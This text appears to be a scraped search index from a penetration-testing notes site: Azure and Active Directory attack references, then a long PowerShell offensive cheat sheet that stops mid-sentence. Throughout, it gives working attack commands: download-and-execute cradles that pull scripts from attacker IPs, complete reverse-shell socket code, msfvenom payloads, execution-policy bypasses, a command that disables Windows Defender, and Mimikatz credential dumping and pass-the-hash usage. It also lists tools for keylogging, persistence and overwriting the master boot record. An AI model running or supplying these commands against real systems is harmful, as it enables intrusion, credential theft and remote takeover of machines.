https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory: https://www.youtube.com/watch?v=JEIR5oGCwdg Azure AD Connect for Red Teamers: https://blog.xpnsec.com/azuread-connect-for-redteam/ https://github.com/hausec/PowerZure How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller: https://adsecurity.org/?p=451 Attack Methods for Gaining Domain Admin Rights in Active Directory: https://adsecurity.org/?p=2362 Mimikatz DCSync Usage, Exploitation, and Detection: https://adsecurity.org/?p=1729 How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398","title":"References"},{"location":"windows/powershell/","text":"Powershell Collections https://sid-500.com/downloads/ Resource: Infosec PowerShell tools, resources, and authors: https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Mayhem scripts: https://gist.github.com/M3T4L5T3F Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts Quick Reference An A-Z Index of Windows PowerShell commands: https://ss64.com/ps/ Windows PowerShell command line syntax: https://ss64.com/ps/syntax.html https://pinvoke.net - Allowing developers to find, edit and add PInvoke * signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET). Versions v1: November 2006 - Windows XP SP2, Windows Server 2003 SP1 and Windows Vista v2: Windows 7 and Windows Server 2008 R2 (Standalone for: Windows XP SP3, Windows Server 2003 SP2, and Windows Vista SP1) v3: Windows 8 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) (no XP support) v4: Windows 8.1 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) v5: Part of Windows Management Framework (WMF) 5.0. February 24, 2016. Features OneGet PowerShell cmdlets to support Chocolatey's repository-based apps. Ability to manage layer 2 network switches Windows 10 Anniversary Update Available for Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2 v6: PowerShell Core on 18 August 2016 Versin information: $ PSVersionTable Get - Host | Select - Object Version $ PSVersionTable Help System Get - Help Get - Process help Get - Process Update - Help Get - Help remoting Get - Help about_ * remot * Basic Execution 64 bit %SystemRoot% \\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.Webclient).DownloadString( http://10.10.14.17/Invoke-PowerShellTcp.ps1 ) 32 bit START /MIN /LOW CMD /C %SystemRoot% \\system32\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.Webclient).DownloadString( http://10.11.0.50/shells/Invoke-PowerShellTcp.ps1 ) Using command line: echo IEX ( New - Object Net . WebClient ). DownloadString ( http://10.10.14.17:8000/Sherlock.ps1 ) | PowerShell - Noprofile - Basic Constructs Cmdlets Function List all Cmdlets: Get - Command - CommandTyle Cmdlet Get - Command - Name * process * Aliases: Get - Alias - Name ps Get - Alias - Definition Get - Process Check Environment C : \\ WIndows \\ Syswow64 \\ Windowspowershell \\ v1 . 0 \\ powershell . exe PSModulePath Version info: powershell - v 2 . 0 - c $ psversiontable Language mode: $ host . runspace . languagemode Check if AppLocker is enabled: Get - AppLockerPolicy - Local Powershell Version: ( Get - Host ). Version 64bit version: %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe Modules . . \\ Example . ps1 Import - Module path_to_module - verbose List all available modules: Get - Module - ListAvailable - All List all modules available in: $ env : PSModulePath All functions exposed by a module: Get - Command - Module module_name Command History (PSReadline) cat ( Get - PSReadlineOption ). HistorySavePath | sls password By default, the path is: profile : \\ AppData \\ Roaming \\ Microsoft \\ Windows \\ PowerShell \\ PSReadline \\ ConsoleHost_history . txt System Information Get - HotFix Jobs Run job on a remote machine using PSSession or by using - AsJob with - ComputerName . With - AsJob it's possible to see remote jobs using Get - Job . Start - Job - ScriptBlock { whoami } Start - Job - FilePath path Get - Job | Receive - Job Get - Job - id id | Receive - Job Remove - Job Get - Command - ParameterName AsJob Directory search: Get - HttpStatus Pass the Hash with Powershell http://www.pwnag3.com/2014/05/what-did-microsoft-just-break-with.html . \\ wce . exe \u2013 s Administrator :.: hashes - c PowerShell . exe Invoke - Mimikatz - Command sekurlsa :: pth / user : Administrator / domain :. / ntlm : ntlmhash / run : powershell . exe Persistence WMI permanent event consumers Windows registry Scheduled tasks Restricting Powershell http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html Process tracking and Module logging. ACL, Software Restriction Policies (SRP) and Application Control Policies (Applocker) could be used to control PowerShell. Both aresupported by GPO, your mileage may vary according to your implementation preferences. __PSLockDownPolicy (v3 only) Just Enough Admin \u2013 Restrict Administrative Rights - http://blogs.technet.com/b/privatecloud/archive/2014/05/14/just-enough-administration-step-by-step.aspx Auditing, Base lining and Incident Management PoshSec - https://github.com/PoshSec Kansa - https://github.com/davehull/Kansa Voyeur - https://github.com/silverhack/voyeur/ Using Virus Total API - https://github.com/darkoperator/Posh-VirusTotal Investigating PowerShell attacks https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks-UPDATED.pdf Bypass Bypassing Applocker Policies - http://www.sixdub.net/2014/12/02/inexorable-powershell-a-red-teamers-tale-of-overcoming-simple-applocker-policies/ Allowing the execution of Powershell functionality without the use of Powershell.exe (.Net): https://github.com/Veil-Framework/PowerTools/tree/master/PowerPick Save output Get - Service | Export - CSV C : \\ Temp \\ AllServices . CSV \u2013 NoTypeInfo Get - User \u2013 Filter \u2018 Name \u2013 Like \u201c * John \u201d\u2019 | Export - CSV C : \\ Temp \\ AllUsers . CSV \u2013 NoTypeInfo Get - ChildItem \u2013 Path C : \\ Windows \\ System32 | Export - CSV C : \\ Temp \\ AllFiles . CSV - NoTypeInfo Reboots: Get-EventLog \u2013Log System \u2013Newest 100 | Where-Object { $_.EventID \u2013 eq \u2018 1074 \u2019 } | FT MachineName, UserName, TimeGenerated -AutoSize Search hotfix: Get - HotFix \u2013 ID KB2877616 Backup Group Policy: Backup - GPO \u2013 All \u2013 Path C : \\ Temp \\ AllGPO Check if all DCs are Global Catalog Servers: Get - ADDomainController \u2013 Filter * | Select Hostname , IsGlobalCatalog Powershell with HID https://github.com/samratashok/Kautilya/ http://www.labofapenetrationtester.com/search/label/Kautilya http://www.irongeek.com/i.php?page=security/plug-and-prey-malicious-usb-devices TCP / UDP / WMI Shells: https://github.com/samratashok/nishang/tree/master/Shells Download Files powershell wget http://example.com/abc.txt -outfile abc.txt Invoke-WebRequest -Uri http://192.168.0.17/PS_TCP4.ps1 -OutFile $fullpath ; powershell -c Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\\Users\\kostas\\Desktop\\41020.exe echo $webclient = New-Object System.Net.WebClient wget.ps1 echo $url = http://10.10.10.10/example.exe wget.ps1 echo $file = example.exe wget.ps1 echo $webclient.DownloadFile($url,$file) wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInterative -NoProfile -File wget.ps1 Base64 encoded payload delivery echo iex (New-Object Net.WebClient).DownloadString( http://172.16.67.128:80/6WcepYO ) | iconv --to-code UTF-16LE | base64 -w 0 kaliwmis-32 -U administrator%badpassword //10.10.10.10 cmd.exe /c powershell.exe -nop -enc base64-value Execution Policy Not a security feature Used to avoid accidental script execution Can be bypass with: powershell . exe - exec Bypass powershell - ExecutionPolicy bypass . \\ example . ps1 powershell - c cmd powershell - EncodedCommand cmd powershell - enc cmd $ env : PSExecutionPolicyPreference = bypass Ref: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6 15 ways to bypass PowerShell execution policy: https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy Reverse Shell http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html Start-Process -FilePath \u201c powershell \u201d -argumentlist \u201c IEX ( New-Object Net . WebClient ). downloadString ( \u2018 http : // 10 . 10 . 14 . 30 / adminshell . ps1 \u2019 ) \u201d -Credential $cred msfvenom -a x86 - -platform Windows -p windows / exec CMD = powershell -c iex(new-object net.webclient).downloadstring( http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1 ) -e x86 / unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister = EAX -f python shellcode powercat -l -v -p 4444 -t 1000 powershell -e encoded-payload $client = New-Object System . Net . Sockets . TCPClient ( 10.10.10.10 , 80 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ){; $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 1 | Out-String ); $sendback2 = $sendback + PS + ( pwd ). Path + ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush ()}; $client . Close () $sm =( New-Object Net . Sockets . TCPClient ( 192.168.254.1 , 55555 )). GetStream (); [byte[]] $bt = 0 .. 255 |%{ 0 }; while (( $i = $sm . Read ( $bt , 0 , $bt . Length )) -ne 0 ){; $d =( New-Object Text . ASCIIEncoding ). GetString ( $bt , 0 , $i ); $st =( [text.encoding] :: ASCII ). GetBytes (( iex $d 2 1 )); $sm . Write ( $st , 0 , $st . Length )} Remote Script execution - Invoke-Expression ( New-Object Net . WebClient ) . DownloadString ( http://example.com/example.ps1 ); - iex ( New-Object Net . WebClient ) . DownloadString ( http://example.com/example.ps1 ); - powershell - EncodedCommand Base64EncodedCommand - $ ie = New-Object -ComObject InternetExplorer . Application ;$ ie . visible =$ False ;$ ie . navigate ( http://example.com/example.ps1 ); sleep 5 ;$ resp =$ ie . Document . Body . innerHTML ;$ ie . quit (); iex $ resp - iex ( iwr http://example.com/example.ps1 ) - $ h = New - Object - ComObject Msxm12 . XMLHTTP ;$h.open( GET , http://192.168.230.1/evil.psi1 ,$false);$h.send();iex $h. responseText - Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter START / B powershell -c IEX ( New-Object Net . Webclient ). downloadstring ( http://10.10.14.2/shell.ps1 ) # _/B prevents creation of a new window_ $wr [System.NET.WebRequest] :: Create ( http://192.168.230.1/evil.psi ) $r = $wr . GetResponse () IEX ( [System.IO.StreamReader] ( $r . GetResponseStream ())) . ReadToEnd ()``` Powershell Remoting Enabled by default from Windows Server 2012 Enable - PSRemoting - Force Admin privileges are required to connect Get - Command - CommandType cmdlet - ParameterName computername Get-Command -CommandType cmdlet | Where-Object { $_Parameters.Keys -- contains ComputerName - and $_Parameters.Keys -- contains Credential - and $_Parameters.Keys -- notcontains Session } WSMAN (WebServicesManagement) Protocol (WinRM) WinRM is Microsoft\u2019s implementation of WSMAN Port 5985, 5986 If target is in a workgroup, attacker's machine should trust target machine to send out credentials: Set-Item WSMan:\\localhost\\client\\trustedhosts -Value * Invoke-Command -ScriptBlock { $env : ComputerName } -ComputerName example -Credential dominName/userName - FilePath Invoke-WSManAction -Action Create -ResourceURI wmicimv2 / win32_process -ValueSet @{ commandline = powershell.exe -c Get-Process } - ComputerName domainpc \u2013 Credential Invoke-WSManAction -Action Create -ResourceURI wmicimv2 / win32_process -ValueSet @{ commandline = powershell.exe -c iex ((New-Object Net.Webclient).DownloadString( http://192.168.254. 1/reverse_powershell.ps1 )) } -ComputerName domainpc WSMAN vs PowerShell Remoting vs WMI WSMAN Firewall friendly Use HTTP and HTTPS ports Syntax is complex Returns immutable objects Can be used with non-Windows machines Powershell Remoting Firewall friendly Easy use Returns immutable objects WMI Not firewall friendly Not NAT friendly Complex Returns editable objects One to One Invoke - Command is stateless for stageful operations use PSSession Interactive, stateful session Run in a new process wsmprovhost New-PSSession $ ses = New - PSSession - ComputerName name - Credential cred Get - PSSession Enter - PSSession Interactive session: Enter - PSSession - Sessions $ ses \u200b$ cred = Get - Credential - Enter - PSSession - ComputerName 10 . 0 . 24 . 244 - Authentication Negotiate - Credential $ cred Define a function in a remote machine and call it: Invoke - Command - ScriptBlock { function Example1 { whoami ; }} - Session $ ses Invoke - Command - ScriptBlock { Example1 } - Session $ ses PSSession - CommandName Example1 - Session $ ses Export a command from a remote machine: Export - PSSession - Module name - CommandName Example1 - Session $ ses Double Hop Problem (Attacker delegate sending token to target-2 from target-1) Enable - WSManCredSSP - Role Client - DelegateComputer Enable - WSManCredSSP - Role Server Get - WSManCredSSP Enter - PSSession - ComputerName name - Credential cred - Authentication CredSSP Useful cmdlets New-PSSession Enter-PSSession Set-MpPreference -DisableRealtimeMonitoring $true #Disable Windows Defender New-PSSession -ComputerName instance $sess = New-PSSession -ComputerName instance Enter-PSSEssion - Session $sess One to Many (Fan-out Remoting) Non-interactive Parallel command execution Can: Execute scripts from files Run commands on multiple remote computers Run commands in disconnected sessions (v3) Run as background task Useful in: Perform command execution without dropping exe onto disk Useful for passing and replying hashes, tickets and other AD attacks Run commands: Invoke - Command - ScriptBlock { whoami ; hostname } - ComputerName instance Invoke - Command - ScriptBlock { Get - Process } - ComputerName ( Get - Content list - of - servers ) Run scripts: Invoke - Command - FilePath example . ps1 - ComputerName instance Run functions installed on the remote box: Invoke-Command -ScriptBlock ${ function : Invoke - Mimikatz } -ComputerName instance Invoke - Command doesn't create a session. Stateful commands: $sess = New-PSSession -ComputerName instance Invoke-Command -Session $sess -ScriptBlock { $proc = Get-Process } Invoke-Command -Session $sess -ScriptBlock { $proc . Name } Tools Mimikatz (ReflectivePEInjection is used to load into memory) Uses ReflectivePEInjection https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/ to load mimikatz into memory Pass the Hash Invoke - Mimikatz - Command sekurlsa::pth /user: name_of_the_user /domain:. /ntlm: ntlmhash /run:powershell.exe Invoke - Mimikatz - Command sekurlsa::pth /user:Administrator /domain:. /ntlm: ntlmhash /run:powershell.exe Invoke - Mimikatz - DumpCreds Invoke - Mimikatz - DumpCerts Dump Creds from multiple machines Invoke - Mimikatz - DumpCreds - ComputerName @ ( instance1 , instance2 ) Load PowerUp powershell - ExecutionPolicy Bypass Import - Module . / PowerUp . ps1 Invoke - AllChecks Active Directory [ADSI] Get member of the domain admin group: ( [ ADSI ] LDAP://cn=Domain Admin,cn=Users,dc=Example,dc=com ). Members Get memberships of a user: ( [ ADSI ] LDAP://cn=Administrator,cn=Users,dc=Example,dc=com ). MemberOf .NET Class: System . DirectoryServices . ActiveDirectory Native Executable PowerShell (,Net classes or WMI or AD module) .Net Exploring Assemblies Finding assemblies $ Classes = [ AppDomain ]:: CurrentDomain . GetAssemblies () $ Classes = [ AppDomain ]:: CurrentDomain . GetAssemblies () | ForEach - Object {$ _ . GetTypes () } | Where - Object {$ _ . IsPublic - eq True } Working with assemblies and invoking functions $ProcClass = $Classes | Where-Object { $_.Name - eq Proccess } $ProcClass | Get-Members $ProcClass | Get-Members -MemberType Method -Static $ProcClass.GetMethods() $ProcClass::GetCurrentProcess() $ProcClass.FullName [System.Diagnostic.Process]::GetCurrentProcess() [System.Diagnostic.Process] | Get-Members -MemberType Method -Static | Format-List * Add - Type - AssemblyName System . Windows . Forms [ System . Windows . Forms . Sendkeys ] AssemblyName Add - Type - AssemblyName System . ServiceProcess [ System . ServiceProcess . ServiceController ] | Get - Members - MemberType Method - Static | Format - List * [ System . ServiceProcess . ServiceController ]:: GetDevices () TypeDefinition $ DotnetCode = @ public class SysCommands public static void lookup ( string domainname ) { System . Diagnostics . Process . Start ( ns lookup.exe , domainname ) ; } public void netcmd ( string cmd ) { string cmdstring = /k net.exe + cmd ; System . Diagnostics . Process . Start ( cmd. exe , cmdstring ) ; } public static void Main () { string cmdstring = /k net.exe + user ; System . Diagnostics . Process . Start ( cmd. exe , cmdstring ); } @ # Compile .Net code and load objects from it Add - Type - TypeDefinition $ DotnetCode - OutputType Library - OutputAssembly SysCommand . dll Add - Type - TypeDefinition $ DotnetCode - OutputType ConsoleApplication - OutputAssembly SysCommand . exe [ SysCommand ] :: lookup ( google.com ) # Load objects from a DLL into Memory $ obj = Add - Type - Path SysCommand . dll - PassThru $ obj | Get - Members [ SysCommand ] :: lookup ( google.com ) # Calling non-static functions $ obj = New - Object SysCommands $ obj . netcmd ( user ) # MemberDefinition - DLL Import $ Apicode = @ [ DllImport ( kerne132.d11 )] public static extern bool CreateSymbolicLink ( string IpSymlinkFileName , string IpTargetFileName , int dwFlags ); @ $ SymLink = Add - Type - MemberDefinition $ ApiCode - Name Symlink - Namespace CreatSymLink - PassThru $ SymLink :: CreateSymbolicLink ( C : \\ test \\ link , C : \\ Users \\ , 1 ) WMI Exploring namespaces: Get - WmiObject - Namespace root - Class __Namespace | select name List even the nested namespaces: http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/ Exploring Classes: Get - WmiObject \u2013 NameSpace \u201c namespace \u201d \u2013 List Exploring Methods: Get - WmiObject - Class class - List | Select - Object - ExpandProperty Methods Filter based on properties of objects getting returned: Get-WmiObject -Class Win32_Process -Filter (Name = powershell.exe ) Get-WmiObject -Class Win32_Process | Where-Object { $_.Name - eq powershell.exe } Get-WmiObject -Query { Select * from Win32_Process where Name = powershell.exe } Remove - WmiObject Invoke - WmiMethod - Class Win32_Process - Name Create - ArgumentList notepad.exe Invoke - WmiMethod - Class Win32_Process - Name Create - ArgumentList notepad.exe - ComputerName name - Credential cred COM Objects Explore available COM objects: Get - ChildItem REGISTRY :: HKEY_CLASSES_ROOT \\ CLSID - include PROGID - recurse | foreach {$ _ . GetValue ( ) } | Where - Object {$ _ - match \u201c appname } $ wscript = New - Object - ComObject WScript . Shell . 1 $ wscript | Get - Member $ wscript . CurrentDirectory $ wscript . SendKeys ( Hello ) $ wscript . Exec ( cmd ) $ wscript . CreateShortcut ( ... ) Interesting COM Objects WScript.Shell.1 Shell.Applcation.1 Windows Registry Get - Item HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Current Version Get - ChildItem HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Current Version - Recurse - Use registry as filesystem: Get - Provider - PSProvider Registry Set - Location Registry :: ls cd HKLM ls New - PSDrive - name RegistryDrive - PSProvider Registry - Root Registry :: dir Get - PSDrive New - Item - Path HKCU : \\ Test \\ New New - ItemProperty - Path HKCU : \\ Test \\ New - Name Reg2 - PropertyType String - Value 2 Rename - Item HKCU : \\ Test - NewName HKCU : TestNew Rename - ItemProperty HKCU : \\ Test \\ New - Name Reg2 - NewName Reg3 Set - ItemProperty - Path HKCU : \\ Test \\ New - Name Reg2 - Value 3 Client Side Attacks Out-Word Out-Excel Out-CHM Out-Shortcut Out-HTA Out-Java Encoding Invole - Encode - DataToEncode example . ps1 - OutCommand Out - CHM - Payload -e encodedValue Metasploit Using Powershell with Metasploit: https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit msfvenom meterpreter . / msfvenom - p windows / x64 / meterpreter / reverse_https LHOST = IP - f psh - reflection cmd / windows / reverse_powershell Useful modules: exploit/windows/smb/psexec_psh Payload is encoded exploit/windows/local/powershell_cmd_upgrade Upgrade native to Powershell post/windows/manage/powershell/exec_powershell exploit/multi/script/web_delivery Modules Posh-SecMod https://github.com/darkoperator/Posh-SecMod - PowerShell Module with Security cmdlets for security work Discovery: Perform network discovery. Parse: Parsers for Nmap, DNSRecon and other type of output files from security tools. PostExploitation: Functions to help in performing post exploitation tasks. Registry: Collection of functions for manipulating the registry in remote hosts using WMI. Utilities: General purpose functions. Audit: Functions that may be usful when performing audit of systems. Database: Functions that are useful when interacting with databases. PowerSploit https://github.com/PowerShellMafia/PowerSploit - A PowerShell Post-Exploitation Framework CodeExecution Invoke - DllInjection Injects a Dll into the process ID of your choosing. Invoke - ReflectivePEInjection Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process. Invoke - Shellcode Injects shellcode into the process ID of your choosing or within PowerShell locally . Invoke - WmiCommand Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel. ScriptModification Out - EncodedCommand Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script. Out - CompressedDll Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory. Out - EncryptedScript Encrypts text files/scripts. Remove - Comments Strips comments and extra whitespace from a script. Persistence New - UserPersistenceOption Configure user-level persistence options for the Add-Persistence function. New - ElevatedPersistenceOption Configure elevated persistence options for the Add-Persistence function. Add - Persistence Add persistence capabilities to a script. Install - SSP Installs a security support provider (SSP) dll. Get - SecurityPackages Enumerates all loaded security packages (SSPs). AntivirusBypass Find - AVSignature Locates single Byte AV signatures utilizing the same method as DSplit from \"class101\". Exfiltration Invoke - TokenManipulation Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread. Invoke - TokenManipulation - CreateProcess cmd.exe - Username nt authority\\system GetProcess lass | Invoke - TokenManipulation - ImperrsonateUser Invoke - CredentialInjection Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon). Invoke - NinjaCopy Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures. Copy from NTDS.dit, SYSTEM, SAM Hive Invoke - Mimikatz Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz. Invoke - Mimikatz - DumpCreds Invoke - Mimikatz - DumpCerts Get - Keystrokes Logs keys pressed, time and the active window. Get - GPPPassword Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. KB2928120 Get - GPPAutologon Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences. Get - TimedScreenshot A function that takes screenshots at a regular interval and saves them to a folder. New - VolumeShadowCopy Creates a new volume shadow copy. Get - VolumeShadowCopy Lists the device paths of all local volume shadow copies. Mount - VolumeShadowCopy Mounts a volume shadow copy. Remove - VolumeShadowCopy Deletes a volume shadow copy. Get - VaultCredential Displays Windows vault credential objects including cleartext web credentials. Out - Minidump Generates a full-memory minidump of a process. Get - MicrophoneAudio Records audio from system microphone and saves to disk Mayhem Set - MasterBootRecord Proof of concept code that overwrites the master boot record with the message of your choice. Set - CriticalProcess Causes your machine to blue screen upon exiting PowerShell. Privesc PowerUp Clearing house of common privilege escalation checks, along with some weaponization vectors. Service Enumeration: Get - ServiceUnquoted - returns services with unquoted paths that also have a space in the name Get - ModifiableServiceFile - returns services where the current user can write to the service binary path or its config Get - ModifiableService - returns services the current user can modify Get - ServiceDetail - returns detailed information about a specified service Service Abuse: Invoke - ServiceAbuse - modifies a vulnerable service to create a local admin or execute a custom command Write - ServiceBinary - writes out a patched C# service binary that adds a local admin or executes a custom command Install - ServiceBinary - replaces a service binary with one that adds a local admin or executes a custom command Restore - ServiceBinary - restores a replaced service binary with the original executable DLL Hijacking: Find - ProcessDLLHijack - finds potential DLL hijacking opportunities for currently running processes Find - PathDLLHijack - finds service %PATH% DLL hijacking opportunities Write - HijackDll - writes out a hijackable DLL Registry Checks: Get - RegistryAlwaysInstallElevated - checks if the AlwaysInstallElevated registry key is set Get - RegistryAutoLogon - checks for Autologon credentials in the registry Get - ModifiableRegistryAutoRun - checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns Miscellaneous Checks: Get - ModifiableScheduledTaskFile - find schtasks with modifiable target files Get - UnattendedInstallFile - finds remaining unattended installation files Get - Webconfig - checks for any encrypted web.config strings Get - ApplicationHost - checks for encrypted application pool and virtual directory passwords Get - SiteListPassword - retrieves the plaintext passwords for any found McAfee's SiteList.xml files Get - CachedGPPPassword - checks for passwords in cached Group Policy Preferences files Other Helpers/Meta-Functions: Get - ModifiablePath - tokenizes an input string and returns the files in it the current user can modify Get - CurrentUserTokenGroupSid - returns all SIDs that the current user is a part of, whether they are disabled or not Add - ServiceDacl - adds a Dacl field to a service object returned by Get-Service Set - ServiceBinPath - sets the binary path for a service to a specified value through Win32 API methods Test - ServiceDaclPermission - tests one or more passed services or service names against a given permission set Write - UserAddMSI - write out a MSI installer that prompts for a user to be added Invoke - AllChecks - runs all current escalation checks and returns a report Recon Invoke - Portscan Does a simple port scan using regular sockets, based (pretty) loosely on nmap. Get - HttpStatus Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file. Invoke - ReverseDnsLookup Scans an IP address range for DNS PTR records. PowerView PowerView is series of functions that performs network and Windows domain enumeration and exploitation. Misc Export - PowerViewCSV - thread-safe CSV append Set - MacAttribute - Sets MAC attributes for a file based on another file or input (from Powersploit) Copy - ClonedFile - copies a local file to a remote location, matching MAC properties Get - IPAddress - resolves a hostname to an IP Test - Server - tests connectivity to a specified server Convert - NameToSid - converts a given user/group name to a security identifier (SID) Convert - SidToName - converts a security identifier (SID) to a group/user name Convert - NT4toCanonical - converts a user/group NT4 name (i.e. dev/john) to canonical format Get - Proxy - enumerates local proxy settings Get - PathAcl - get the ACLs for a local/remote file path with optional group recursion Get - UserProperty - returns all properties specified for users, or a set of user:prop names Get - ComputerProperty - returns all properties specified for computers, or a set of computer:prop names Find - InterestingFile - search a local or remote path for files with specific terms in the name Invoke - CheckLocalAdminAccess - check if the current user context has local administrator access to a specified host Get - DomainSearcher - builds a proper ADSI searcher object for a given domain Get - ObjectAcl - returns the ACLs associated with a specific active directory object Add - ObjectAcl - adds an ACL to a specified active directory object Get - LastLoggedOn - return the last logged on user for a target host Get - CachedRDPConnection - queries all saved RDP connection entries on a target host Invoke - ACLScanner - enumerate -1000+ modifable ACLs on a specified domain Get - GUIDMap - returns a hash table of current GUIDs - display names Get - DomainSID - return the SID for the specified domain Invoke - ThreadedFunction - helper that wraps threaded invocation for other net * Functions: Get - NetDomain - gets the name of the current user's domain Get - NetForest - gets the forest associated with the current user's domain Get - NetForestDomain - gets all domains for the current forest Get - NetDomainController - gets the domain controllers for the current computer's domain Get - NetUser - returns all user objects, or the user specified (wildcard specifiable) Add - NetUser - adds a local or domain user Get - NetComputer - gets a list of all current servers in the domain Get - NetPrinter - gets an array of all current computers objects in a domain Get - NetOU - gets data for domain organization units Get - NetSite - gets current sites in a domain Get - NetSubnet - gets registered subnets for a domain Get - NetGroup - gets a list of all current groups in a domain Get - NetGroupMember - gets a list of all current users in a specified domain group Get - NetLocalGroup - gets the members of a localgroup on a remote host or hosts Add - NetGroupUser - adds a local or domain user to a local or domain group Get - NetFileServer - get a list of file servers used by current domain users Get - DFSshare - gets a list of all distribute file system shares on a domain Get - NetShare - gets share information for a specified server Get - NetLoggedon - gets users actively logged onto a specified server Get - NetSession - gets active sessions on a specified server Get - NetRDPSession - gets active RDP sessions for a specified server (like qwinsta) Get - NetProcess - gets the remote processes and owners on a remote server Get - UserEvent - returns logon or TGT events from the event log for a specified host Get - ADObject - takes a domain SID and returns the user, group, or computer object associated with it Set - ADObject - takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified 'PropertyName' to a specified 'PropertyValue' GPO functions: Get - GptTmpl - parses a GptTmpl.inf to a custom object Get - NetGPO - gets all current GPOs for a given domain Get - NetGPOGroup - gets all GPOs in a domain that set \"Restricted Groups\" on on target machines Find - GPOLocation - takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation Find - GPOComputerAdmin - takes a computer and determines who has admin rights over it through GPO enumeration Get - DomainPolicy - returns the default domain or DC policy User-Hunting Functions: Invoke - UserHunter - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines Invoke - StealthUserHunter - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users Invoke - ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines Invoke - UserEventHunter - hunts for user logon events in domain controller event logs Domain Trust Functions: Get - NetDomainTrust - gets all trusts for the current user's domain Get - NetForestTrust - gets all trusts for the forest associated with the current user's domain Find - ForeignUser - enumerates users who are in groups outside of their principal domain Find - ForeignGroup - enumerates all the members of a domain's groups and finds users that are outside of the queried domain Invoke - MapDomainTrust - try to build a relational mapping of all domain trusts MetaFunctions: Invoke - ShareFinder - finds (non-standard) shares on hosts in the local domain Invoke - FileFinder - finds potentially sensitive files on hosts in the local domain Find - LocalAdminAccess - finds machines on the domain that the current user has local admin access to Find - ManagedSecurityGroups - searches for active directory security groups which are managed and identify users who have write access to those groups (i.e. the ability to add or remove members) Find - UserField - searches a user field for a particular term Find - ComputerField - searches a 